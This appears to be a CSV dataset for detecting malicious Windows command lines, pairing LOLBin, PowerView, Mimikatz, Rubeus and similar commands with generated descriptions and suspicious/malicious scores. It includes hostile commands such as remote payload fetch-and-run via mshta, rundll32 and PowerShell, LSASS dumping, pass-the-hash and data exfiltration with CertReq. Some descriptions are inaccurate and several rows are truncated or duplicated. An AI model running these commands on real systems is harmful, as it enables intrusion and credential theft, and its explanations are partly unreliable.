prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label,,
makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab,"This command can be used to compress a file into a cabinet (.cab) file format, which can be used to transfer files over the network, and potentially hide malicious files or payloads.",makecab,C:\\Folder\\file.cab,none,\\\\webdavserver\\webdav\\file.exe,none,none,none,0.55,suspicious,,
Microsoft.Workflow.Compiler.exe tests.xml results.xml,"Potential use in a cyberattack: Compiling and executing malicious code in a workflow to evade detection.

What it might do on a Windows machine: Compiles a workflow file (tests.xml) and saves the results to another file (results.xml).",Microsoft.Workflow.Compiler.exe,results.xml,none,tests.xml,none,none,none,0.55,suspicious,,
Microsoft.Workflow.Compiler.exe tests.txt results.txt,This command is used to compile a Microsoft Workflow file and can potentially be used to execute malicious code or scripts on a Windows machine.,Microsoft.Workflow.Compiler.exe,results.txt,none,tests.txt,none,none,none,0.55,suspicious,,
odbcconf -f file.rsp,"This command can be used to install or configure ODBC drivers and data sources, which can be useful for accessing and exfiltrating data from databases on a compromised machine.",odbcconf,file.rsp,none,none,none,-f,none,0.55,suspicious,,
pcalua.exe -a calc.exe,"This command can be used to execute the Windows Calculator (calc.exe) with elevated privileges, potentially allowing an attacker to bypass security measures and gain access to sensitive information on the machine.",pcalua.exe,calc.exe,none,none,none,-a,none,0.55,suspicious,,
Pcwrun.exe c:\\temp\\beacon.exe,This command can be used to execute a beacon payload from a temporary directory on a compromised Windows machine.,Pcwrun.exe,c:\\temp\\beacon.exe,none,c:\\temp\\beacon.exe,none,none,none,0.55,suspicious,,
Presentationhost.exe C:\\temp\\Evil.xbap,"This command can be used to execute a malicious .xbap file from a specified location on the victim's machine, potentially allowing an attacker to gain remote access or execute further attacks.",Presentationhost.exe,C:\\temp\\Evil.xbap,none,C:\\temp\\Evil.xbap,none,none,none,0.55,suspicious,,
psr.exe /start /output D:\\test.zip /sc 1 /gui 0,"This command can be used to record user actions and take screenshots, potentially capturing sensitive information, and save them to a compressed file on the D drive without displaying the recording interface.",psr.exe,D:\\test.zip,none,none,none,"/start,/output,/sc",none,0.55,suspicious,,
regasm.exe /U AllTheThingsx64.dll,"This command can be used to register a malicious .dll file as a COM object, allowing an attacker to execute arbitrary code on the compromised system.",regasm.exe,AllTheThingsx64.dll,none,none,none,/U,none,0.55,suspicious,,
replace.exe C:\\Source\\File.cab C:\\Destination /A,"This command can be used to replace a file on a Windows machine and potentially overwrite important system files, allowing an attacker to gain persistence or execute malicious code.",replace.exe,C:\\Destination /A,none,C:\\Source\\File.cab,none,none,none,0.55,suspicious,,
replace.exe \\\\webdav.host.com\\foo\\bar.exe c:\\outdir /A,"This command can be used to replace a legitimate executable with a malicious one on a remote machine, potentially allowing for remote code execution.",replace.exe,c:\\outdir /A,none,\\\\webdav.host.com\\foo\\bar.exe,none,none,none,0.55,suspicious,,
Scriptrunner.exe -appvscript calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through the ScriptRunner application, potentially allowing an attacker to run arbitrary code or commands on a compromised machine.",Scriptrunner.exe,calc.exe,none,none,none,-appvscript,none,0.55,suspicious,,
tttracer.exe C:\\windows\\system32\\calc.exe,"This command can be used to execute the Windows calculator (calc.exe) in a hidden manner, potentially as a decoy while other malicious activities are being carried out.",tttracer.exe,C:\\windows\\system32\\calc.exe,none,C:\\windows\\system32\\calc.exe,none,none,none,0.55,suspicious,,
verclsid.exe /S /C {CLSID},"This command can be used to check the version of a COM object and potentially identify vulnerable versions, or to execute a malicious COM object with a specific CLSID.",verclsid.exe,CLSID,none,none,none,"/S,/C",none,0.55,suspicious,,
wmic.exe process call create calc,"Potential use: Execute a calculator program on a remote Windows machine.
What it does: Creates a new process to run the Windows calculator program.",wmic.exe,calc,none,none,none,create,none,0.55,suspicious,,
wscript c:\\ads\\file.txt:script.vbs,"This command can be used to execute a VBScript file located in a hidden Alternate Data Stream (ADS) of a text file, allowing an attacker to hide their malicious code and evade detection.",wscript ,c:\\ads\\file.txt:script.vbs,none,c:\\ads\\file.txt,none,none,none,0.55,suspicious,,
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},This command can be used to execute a custom wizard and could potentially be used in a cyberattack to run a malicious wizard on a Windows machine.,xwizard,00000001-0000-0000-0000-0000FEEDACDC,none,none,none,RunWizard,none,0.55,suspicious,,
"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump ""[LSASS_PID] dump.bin full""","This command can be used to dump the memory of the Local Security Authority Subsystem Service (LSASS) process, which contains sensitive information such as passwords, and can be used for further analysis or exploitation.",rundll32 ,[LSASS_PID] dump.bin,none,C:\\windows\\system32\\comsvcs.dll,none,none,none,0.55,suspicious,,
AppVLP.exe \\\\webdav\\calc.bat,"This command can be used to execute a batch file hosted on a remote server, potentially allowing an attacker to run malicious code on a victim's machine.",AppVLP.exe,\\\\webdav\\calc.bat,none,\\\\webdav\\calc.bat,none,none,none,0.55,suspicious,,
bginfo.exe bginfo.bgi /popup /nolicprompt,"Displays system information on the desktop background, potentially useful for reconnaissance and information gathering during a cyberattack.",bginfo.exe,bginfo.bgi,none,none,none,"/popup,/nolicprompt",none,0.55,suspicious,,
bginfo.exe bginfo.bgi /popup /nolicprompt,"Displays system information on the desktop background, potentially useful for reconnaissance and information gathering during a cyberattack.",bginfo.exe,bginfo.bgi,none,none,none,"/popup,/nolicprompt",none,0.55,suspicious,,
cdb.exe -cf x64_calc.wds -o notepad.exe,"This command can be used to create a malicious payload by converting a Windows Debugger Script (WDS) file containing shellcode into an executable file (notepad.exe) using the Crash Dump Builder (cdb.exe) tool, which can then be used to execute arbitrary code on a target machine.",cdb.exe,x64_calc.wds,none,none,none,"-cf,-o",none,0.55,suspicious,,
"DefaultPack.EXE /C:""process.exe args""",This command can be used to execute a process with arguments and can be used in a living off the land attack to run malicious code or execute a payload on a Windows machine.,DefaultPack.EXE,"/C:""process.exe args""",none,"/C:""process.exe args""",none,none,none,0.55,suspicious,,
"devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] ""argument here"" test",This command can be used to launch a binary for deployment and testing purposes.,devtoolslauncher.exe,PATH_TO_BIN,none,none,none,"LaunchForDeploy,test",none,0.55,suspicious,,
dotnet.exe [PATH_TO_DLL],Execute a .NET assembly and potentially load a malicious DLL for code execution or persistence.,dotnet.exe,PATH_TO_DLL,none,PATH_TO_DLL,none,none,none,0.55,suspicious,,
dotnet.exe [PATH_TO_DLL],Execute a .NET assembly and potentially load a malicious DLL for code execution or persistence.,dotnet.exe,PATH_TO_DLL,none,PATH_TO_DLL,none,none,none,0.55,suspicious,,
msxsl.exe customers.xml script.xsl,"This command can be used to execute an XSL script on an XML file, potentially allowing an attacker to extract sensitive information from the XML file or modify its contents.",msxsl.exe,customers.xml,none,script.xsl,none,none,none,0.55,suspicious,,
msxsl.exe customers.xml script.xsl,"This command can be used to execute an XSL script on an XML file, potentially allowing an attacker to extract sensitive information from the XML file or modify its contents.",msxsl.exe,customers.xml,none,script.xsl,none,none,none,0.55,suspicious,,
"Powerpnt.exe ""http://amaare.mere/TeamsAddinLoader.dll""","This command could potentially download and execute a malicious DLL file from a remote server, allowing an attacker to gain persistence and potentially execute further malicious actions on the compromised machine.",Powerpnt.exe,http://amaare.mere/TeamsAddinLoader.dll,none,http://amaare.mere/TeamsAddinLoader.dll,none,none,none,0.55,suspicious,,
sqldumper.exe 464 0 0x0110,"Potential use: Dumping memory of a running SQL Server process for further analysis.
What it does: Executes the SQL Server process with the specified process ID and generates a memory dump file for analysis.",sqldumper.exe,464,none,0x0110,none,none,none,0.55,suspicious,,
SQLToolsPS.exe -noprofile -command Start-Process calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through SQLToolsPS.exe, potentially allowing an attacker to bypass security measures and run arbitrary code on the target machine.",SQLToolsPS.exe,calc.exe,none,none,none," -noprofile,-command,Start-Process",none,0.55,suspicious,,
"Pester.bat [/help|?|-?|/?] ""$null; notepad""","This command can be used to execute a PowerShell script that can be used to download and execute malicious code, while also opening a decoy notepad window to avoid suspicion.",Pester.bat,notepad,none,none,none,"/help,?,-?,/?",none,0.55,suspicious,,
MSBuild.exe \\host.domain\path\to\XMLfile.xml,"This command can be used to execute an XML file containing MSBuild instructions, which can be used to build and compile code, potentially allowing an attacker to execute malicious code on the target machine.",MSBuild.exe,\\host.domain\path\to\XMLfile.xml,none,\\host.domain\path\to\XMLfile.xml,none,none,none,0.55,suspicious,,
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml,"This command can be used to execute an XML file on a remote host, potentially allowing an attacker to execute arbitrary code on the target machine.",MSBuild.exe,\\host.domain\path\to\XMLfile.xml,none,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe,none,none,none,0.55,suspicious,,
"powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application""","This command can be used to launch the Microsoft Management Console (MMC) on a Windows machine, which can be used to manage various aspects of the system, including services, event logs, and certificates. In a cyberattack, this command could be used to gain access to sensitive information or to modify system settings.",powershell,MMC20.Application,none,none,none,CreateInstance,none,0.55,suspicious,,
"powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application""","This command can be used to launch the Microsoft Management Console (MMC) on a Windows machine, which can be used to manage various system settings and configurations, and could potentially be used by an attacker to gain further access or control over the system.",powershell,MMC20.Application,none,none,none,CreateInstance,none,0.55,suspicious,,
mshta.exe http://malicious.domain/runme.hta,"This command can be used to execute a malicious HTA file from a remote server, potentially allowing an attacker to download and execute additional malware on the compromised system.",mshta.exe,http://malicious.domain/runme.hta,none,http://malicious.domain/runme.hta,none,none,none,0.55,suspicious,,
"rundll32.exe javascript:""..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,..\mshtml,none,javascript,none,none,none,0.55,suspicious,,
"rundll32.exe javascript:""..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,..\mshtml,none,javascript,none,none,none,0.55,suspicious,,
rundll32.exe url.dll,"Can be used to launch a URL or execute a DLL file, potentially used to download and execute malicious code.",rundll32.exe,url.dll,none,url.dll,none,none,none,0.55,suspicious,,
"powershell [Delegate]::CreateDelegate((""Func``3[String","This command can be used to create a delegate function in PowerShell, which can be used to execute arbitrary code and potentially bypass security measures on a Windows machine.",powershell,Func``3[String,none,none,none,CreateDelegate,none,0.55,suspicious,,
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET',"This command can be used to send a GET request to a web server and retrieve data, which can be used to exfiltrate sensitive information from a compromised machine.",powershell,WinHttp.WinHttpRequest.5.1,none,none,none,"new-object,-com,GET",none,0.55,suspicious,,
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET',"This command can be used to send a GET request to a web server and retrieve data, which can be used to exfiltrate sensitive information from a compromised machine.",powershell,WinHttp.WinHttpRequest.5.1,none,none,none,"new-object,-com,GET",none,0.55,suspicious,,
powershell $bytes = [System.Text.Encoding]::Unicode.GetBytes($command),"This command encodes a given command in Unicode format and stores it in a variable called $bytes, which could potentially be used to execute malicious code or commands on a Windows machine using PowerShell.",powershell,$command,none,none,none,Unicode.GetBytes,none,0.55,suspicious,,
powershell $encodedCommand = [Convert]::ToBase64String($bytes),"This command can be used to encode a PowerShell script into base64 format, which can then be executed on a Windows machine without being detected by antivirus software.",powershell,$bytes,none,none,none,ToBase64String,none,0.55,suspicious,,
"powershell Get-DomainGroup ""Domain Admins""","Potential use: Enumeration of privileged accounts.
What it does: Retrieves the members of the ""Domain Admins"" group in the current domain using PowerShell.",powershell,Domain Admins,none,none,none,Get-DomainGroup,none,0.55,suspicious,,
"powershell Get-DomainGroupMember ""Domain Admins"" | select -ExpandProperty membername","This command can be used to enumerate all members of the ""Domain Admins"" group in a Windows domain, which can be useful for lateral movement and privilege escalation in a cyberattack.",powershell,Domain Admins,none,none,none,"Get-DomainGroupMember,select,-ExpandProperty",none,0.55,suspicious,,
powershell Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname,This command can be used to enumerate all the domain-joined servers in an Active Directory environment and retrieve their hostnames. It can be used for reconnaissance purposes in a cyberattack.,powershell,Get-DomainComputer -SearchBase $_.distinguishedname,none,none,none,"Get-DomainOU,-name,select",none,0.55,suspicious,,
powershell Get-DomainOU *WS* | select gplink,"This command can be used to enumerate all Organizational Units (OUs) in a domain that contain ""WS"" in their name and retrieve the Group Policy Links (GPLink) associated with them. This information can be used to identify potential targets for lateral movement or privilege escalation.",powershell,gplink,none,none,none,Get-DomainOU,none,0.55,suspicious,,
powershell Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName,This command can be used to enumerate the members of a local group in a Group Policy Object (GPO) and can be used in a cyberattack to gather information about the target machine's local group membership.,powershell,GPODisplayName,none,none,none,"Get-DomainGPOLocalGroup,-ResolveMembersToSIDs",none,0.55,suspicious,,
"powershell Get-DomainObjectAcl -SearchBase ""CN=Policies","This command can be used to retrieve the access control list (ACL) of a domain object in Active Directory, which can be useful for identifying potential vulnerabilities or weaknesses in the system.",powershell,CN=Policies,none,none,none,"Get-DomainObjectAcl,-SearchBase",none,0.55,suspicious,,
"powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq ""GP-Link"" -and $_.ActiveDirectoryRights -match ""WriteProperty"" } | select ObjectDN","This command can be used to find Group Policy Objects (GPOs) that have write permissions, which can be abused to modify GPOs and potentially execute code or escalate privileges on a Windows machine.",powershell,"$_.ObjectAceType -eq ""GP-Link"" -and $_.ActiveDirectoryRights -match ""WriteProperty",none,none,none,"Get-DomainOU,Get-DomainObjectAcl,-ResolveGUIDs,select",none,0.55,suspicious,,
"powershell Get-DomainObjectAcl -SamAccountName ""Domain Admins"" -ResolveGUIDs | Select IdentityReference","This command can be used to retrieve the access control list (ACL) of the ""Domain Admins"" group and potentially identify privileged accounts in a Windows domain environment.",powershell,Domain Admins,none,none,none,"Get-DomainObjectAcl,-ResolveGUIDs,select",none,0.55,suspicious,,
"powershell Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match ""Domain Admins""} | select ObjectDN","This command can be used to find interesting domain ACLs and extract the distinguished name of the objects that have the ""Domain Admins"" group in their ACLs.",powershell,"$_.IdentityReference -match ""Domain Admins""",none,none,none,"Find-InterestingDomainAcl,-ResolveGUIDs,select",none,0.55,suspicious,,
powershell Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True },"This command can be used to find the location of domain users with local admin access on a Windows machine, which can be useful for privilege escalation in a cyberattack.",powershell,$_.LocalAdmin -Eq True ,none,none,none,"Find-DomainUserLocation,-CheckAccess",none,0.55,suspicious,,
"powershell Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match ""RDPUsers""}",This command can be used to find interesting domain ACLs related to RDPUsers group and resolve their GUIDs in PowerShell on a Windows machine.,powershell,"$_.IdentityReferenceName -match ""RDPUsers""",none,none,none,"Find-InterestingDomainAcl,-ResolveGUIDs",none,0.55,suspicious,,
"powershell Invoke-Mimikatz -Command '""kerberos::list /export""'",This command can be used to extract Kerberos tickets from memory and can be used in a cyberattack to perform pass-the-hash attacks on other machines in the network.,powershell,kerberos::list,none,none,none,"Invoke-Mimikatz,-Command,/export",none,0.55,suspicious,,
"powershell Invoke-TokenManipulation -ImpersonateUser -Username ""domain\user""","This command can be used to impersonate a user and gain access to their privileges, allowing an attacker to move laterally within a network and potentially escalate their privileges.",powershell,domain\user,none,none,none,"Invoke-TokenManipulation,-ImpersonateUser",none,0.55,suspicious,,
"powershell Invoke-TokenManipulation -CreateProcess ""C:\Windows\system32\calc.exe"" -ProcessId 500","This command can be used to create a new process with elevated privileges and execute a malicious payload, in this case, launching the calculator application with the process ID of 500.",powershell,C:\Windows\system32\calc.exe,none,none,none,"Invoke-TokenManipulation,-CreateProcess,-ProcessId",none,0.55,suspicious,,
powershell Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>,"This command can be used to collect information about Active Directory and its relationships, which can be used to plan and execute a privilege escalation attack. It will output the collected data to a specified directory.",powershell,PathToFile,none,none,none,"Invoke-BloodHound,--CollectionMethod,--OutputDirectory",none,0.55,suspicious,,
"powershell Invoke-Mimikatz -Command '""kerberos::list /export""'",This command can be used to extract Kerberos tickets from memory and can be used in a cyberattack to perform pass-the-hash attacks on other machines in the network.,powershell,kerberos::list,none,none,none,"Invoke-Mimikatz,/export",none,0.55,suspicious,,
"powershell Get-SQLServerLinkCrawl -Instace <SPN> -Query ""exec master..xp_cmdshell 'whoami'""","This command can be used to crawl SQL Server links and execute a command to run the ""whoami"" command on the target machine, potentially revealing the current user context of the compromised machine.",powershell,"exec master..xp_cmdshell 'whoami'""",none,none,none,"Get-SQLServerLinkCrawl,-Instace",none,0.55,suspicious,,
powershell powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1,"This command imports a PowerShell script called Sherlock.ps1 from the specified file path, which could be used to search for vulnerabilities and misconfigurations on a Windows machine during a cyberattack.",powershell,C:\Users\Rasta\Desktop\Sherlock.ps1,none,none,none,powershell-import,none,0.55,suspicious,,
powershell $client = New-Object -TypeName System.Net.Http.Httpclient,"This command can be used to create a new HTTP client object in PowerShell, which can be used to send HTTP requests to a server, potentially for exfiltration of data or remote code execution.",powershell,System.Net.Http.Httpclient,none,none,none,New-Object,none,0.55,suspicious,,
powershell [io.file]::WriteAllBytes($file,"This command can be used to write arbitrary bytes to a file, potentially allowing an attacker to modify or corrupt important system files on a Windows machine.",powershell,$file,none,none,none,WriteAllBytes,none,0.55,suspicious,,
mshta http://webserver/payload.hta,"This command can be used to execute a malicious payload hosted on a remote server, allowing an attacker to gain remote access or execute arbitrary code on the victim's machine.",mshta ,http://webserver/payload.hta,none,http://webserver/payload.hta,none,none,none,0.55,suspicious,,
mshta.exe http://webserver/payload.hta,"This command can be used to execute a malicious payload hosted on a remote web server, potentially allowing an attacker to gain remote access to the compromised machine.",mshta.exe,http://webserver/payload.hta,none,http://webserver/payload.hta,none,none,none,0.55,suspicious,,
rundll32 \\webdavserver\folder\payload.dll,This command can be used to execute a malicious payload stored in a remote WebDAV server on a Windows machine.,rundll32 ,\\webdavserver\folder\payload.dll,none,\\webdavserver\folder\payload.dll,none,none,none,0.55,suspicious,,
rundll32.exe \\webdavserver\folder\payload.dll,"This command can be used to execute a malicious payload stored on a remote server via WebDAV, allowing an attacker to remotely execute code on a Windows machine.",rundll32.exe,\\webdavserver\folder\payload.dll,none,\\webdavserver\folder\payload.dll,none,none,none,0.55,suspicious,,
"powershell $client = New-Object System.Net.Sockets.TCPClient(""merelelu.ana""","This command creates a new TCP client object and connects to the specified IP address and port, potentially allowing for remote communication and data exfiltration.",powershell,System.Net.Sockets.TCPClient,none,none,none,New-Object,none,0.55,suspicious,,
WinHttp.WinHttpRequest.5.1;$h.open('POST',"This command can be used to send HTTP POST requests to a remote server, potentially allowing an attacker to exfiltrate data or execute commands on a compromised machine.",none,WinHttp.WinHttpRequest.5.1,none,none,none,"new-object,$h.open,POST",none,0.55,suspicious,,
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('POST',"This command can be used to send HTTP POST requests to a remote server, potentially allowing an attacker to exfiltrate data or execute commands on a compromised machine.",powershell,WinHttp.WinHttpRequest.5.1,none,none,none,"new-object,$h.open,POST",none,0.55,suspicious,,
C:\Windows\System32\WScript.exe C:\Users\admin\enYXval36C\38oDr5.vbs,This command can be used to execute a VBScript file and potentially run malicious code on a Windows machine.,Wscript.exe,C:\Users\admin\enYXval36C\38oDr5.vbs,none,C:\Windows\System32\WScript.exe,none,none,none,0.55,suspicious,,
C:\Windows\System32\Rundll32.exe 8ivq.dll arzy949,This command is not a legitimate Windows command and appears to be malicious.,Rundll32.exe,8ivq.dll,none,C:\Windows\System32\Rundll32.exe,none,none,none,0.55,suspicious,,
C:\Windows\System32\mshta.exe ransom.hta,"This command can be used to execute a ransomware attack by running a malicious HTA file through the Microsoft HTML Application Host, potentially encrypting files on the Windows machine.",mshta.exe,ransom.hta,none,C:\Windows\System32\mshta.exe,none,none,none,0.55,suspicious,,
C:\Windows\SysWOW64\Rundll32.exe {64F97CDC...FAB40CA\}.db #1 #1},This command can be used to execute a malicious DLL file and potentially execute arbitrary code on the system.,Rundll32.exe, {64F97CDC...FAB40CA\}.db,none,C:\Windows\SysWOW64\Rundll32.exe,none,none,none,0.55,suspicious,,
"C:\Python27\python.exe -c ""(lambda __y",This is an incomplete command and cannot be used for any purpose.,none,lambda,none,C:\Python27\python.exe,none,-c,none,0.60,malicious,,
"C:\Python27\python.exe -c ""(lambda __y",This command executes a Python script and could potentially be used to run malicious Python code on a Windows machine.,none,lambda,none,C:\Python27\python.exe,none,-c,none,0.60,malicious,,
winrs -r:10.10.10.10 -u:DOMAIN\user -p:password calc.exe,"This command can be used to remotely execute the Windows calculator on a machine with IP address 10.10.10.10 using the specified user credentials, which could potentially be used in a cyberattack for lateral movement or privilege escalation.",none,calc.exe,none,none,10.10.10.10,-r,none,0.60,malicious,,
"SharpGPOAbuse.exe --AddComputerTask --TaskName ""Microsoft LEGITIMATE Hotfix"" --Author NT AUTHORITY\SYSTEM --Command ""cmd.exe"" --Arguments ""/c start calc.exe"" --GPOName ""Totally Legit GPO""","This command can be used to add a malicious task to a legitimate GPO, which when executed on a Windows machine, will launch the calculator application as a proof of concept.", none,/c start calc.exe,none,AUTHORITY\SYSTEM,none,"--AddComputerTask,--Command",none,0.60,malicious,,
.\chisel.exe client 192.168.49.67:80 R:socks,"This command can be used to establish a SOCKS proxy connection to a remote server, which can be used to bypass network restrictions and exfiltrate data from a compromised machine.",none,chisel.exe,none,none,192.168.49.67:80,"client,R:socks",none,0.60,malicious,,
.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>,"This command can be used to collect information about the domain and its users, groups, computers, and other objects, which can be used for reconnaissance and privilege escalation in a cyberattack. It will run the SharpHound tool with the specified collection method, LDAP credentials, domain information, and output directory.",none,PathToFile,none,Domain,none,"--CollectionMethod,--domaincontroller,--OutputDirectory",none,0.60,malicious,,
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>,"This command can be used to perform pass-the-hash attacks by impersonating a user and obtaining their NTLM hash, allowing an attacker to authenticate as that user without knowing their password.",none,/ntlm:<>,none,/domain:<DomainFQDN>,none,"mimikatz,sekurlsa::pth",none,0.60,malicious,,
mimikatz sekurlsa::minidump c:\temp\lsass.dmp,This command can be used to extract plaintext passwords from the memory of a Windows machine and can be used in a Pass-the-Hash attack.,none,sekurlsa::minidump,none,c:\temp\lsass.dmp,none,mimikatz,none,0.60,malicious,,
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>,"This command can be used to perform a Kerberoasting attack and extract Kerberos tickets for user accounts in the specified domain, with the output saved to a file.",none, /outfile:<fileName>,none,/domain:<DomainName>,none,kerberoast,none,0.60,malicious,,
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\,"This command creates a symbolic link to the shadow copy of a hard disk volume, which could be used to access and exfiltrate sensitive data from a compromised system.",none,\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\,none,c:\shadowcopy,none,/d,none,0.60,malicious,,
".\RoguePotato.exe -r 10.10.14.9 -e ""cmd.exe /c ping 10.10.14.9"" -l 9999","This command can be used to execute a reverse shell and establish a connection with the attacker's machine, allowing them to execute arbitrary commands on the compromised machine and potentially exfiltrate data.",RoguePotato.exe,cmd.exe,none,none,"10.10.14.9,9999","-r,-e",none,0.60,malicious,,
"call bitsDownloader.bat ""https://download.sysinternals.com/files/PSTools.zip"" pstools.zip","This command can be used to download a file from a remote server using BITS (Background Intelligent Transfer Service) and execute a batch file, potentially allowing an attacker to download and execute malicious files on a compromised machine.",none,pstools.zip,none,https://download.sysinternals.com/files/PSTools.zip,none,"call,bitsDownloader.bat",none,0.60,malicious,,
"call winhhtpjs.bat ""https://example.com/files/some.zip"" -saveTo ""c:\somezip.zip""","Potential use in a cyberattack: Downloading and executing malicious code from a remote server.

What it might do on a Windows machine: Downloads a file from a specified URL and saves it to a specified location on the local machine.",none,c:\somezip.zip,none,https://example.com/files/some.zip,none,"call,winhhtpjs.bat",none,0.60,malicious,,
"call XMLHTTPDownloadJS.bat ""https://download.sysinternals.com/files/PSTools.zip pst2.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, which can be useful for delivering malicious payloads or downloading additional tools for the attacker to use.",none,pstools.zip,none,https://download.sysinternals.com/files/PSTools.zip,none,"call,XMLHTTPDownloadJS.bat",none,0.60,malicious,,
"call webclientDownload.bat ""https://download.sysinternals.com/files/PSTools.zip"" pstools.zip","Potential use: Downloading and executing malicious tools or payloads from a remote server.

What it does: Downloads the PSTools.zip file from the specified URL using the webclientDownload.bat script.",none,pstools.zip,none,https://download.sysinternals.com/files/PSTools.zip,none,"call,webclientDownload.bat",none,0.60,malicious,,
Regsvr32 ..\Kro.fis2,Adversaries may use regsvr32.exe to execute malicious DLLs.,Regsvr32,Kro.fis2,none,..\Kro.fis2,none,none,Mitre Attack,0.6,malicious,,
"PowerShell -c (New-Object System.Net.WebClient).DownloadFile(‘http://w2a0zj.pw/wnxtp2.exe’, ‘.\morose.exe’); Start(‘.\morose.exe’)",Adversaries may use powershell.exe to download payloads or execute malicious PowerShell-based tools or scripts.,PowerShell,morose.exe,none,http://w2a0zj.pw/wnxtp2.exe,none,DownloadFile,Mitre Attack,0.6,malicious,,
Netsh add helper C:/Users/Public/settingsync.dll,Adversaries may use netsh to gain persistence by executing helper DLL.,netsh, C:/Users/Public/settingsync.dll,none,none,none, add helper,Mitre Attack,0.6,malicious,,
C:\Windows\system32\net.exe stop “samss” /y,Adversaries can use net.exe to stop services on the target system.,net.exe,"/y, samss",none,none,none,stop ,Mitre Attack,0.6,malicious,,
start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw,"This command could potentially download and execute a malicious application from a remote source, allowing an attacker to gain access to the victim's machine.",ms-appinstaller,https://pastebin.com/raw/tdyShwLw,none,source=https://pastebin.com/raw/tdyShwLw,none,start,none,0.65,malicious,,
C:\\Windows\\System32\\at.exe at 09:00 /interactive /every:m,"This command schedules a task to run every day at 9:00 AM with interactive privileges, which could potentially be used to execute malicious code or commands at a specific time without being detected.",at.exe,C:\\Windows\\System32\\at.exe,none,C:\\Windows\\System32\\at.exe,none,"at 09:00,/interactive,/every:m",none,0.65,malicious,,
ATBroker.exe /start malware,"Potential use: Launches malware through the ATBroker.exe process.
What it does: Executes the specified malware payload through the ATBroker.exe process, which is a legitimate Windows accessibility tool, allowing the attacker to evade detection.",ATBroker.exe,malware,none,malware,none,/start,none,0.65,malicious,,
CertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt,This command can be used to request a certificate from a remote server and potentially exfiltrate sensitive information from the win.ini file on the victim's machine.,CertReq,c:\\windows\\win.ini,none,https://example.org/,none,"-Post,-config,output.txt",none,0.65,malicious,,
CertReq -Post -config https://example.org/ c:\\windows\\win.ini and show response in terminal,"This command could potentially be used to exfiltrate sensitive information from the target machine by requesting a certificate from a remote server and posting the contents of the win.ini file to it, with the response being displayed in the terminal.",CertReq,c:\\windows\\win.ini,none,https://example.org/,none,"-Post,-config,show response in terminal",none,0.65,malicious,,
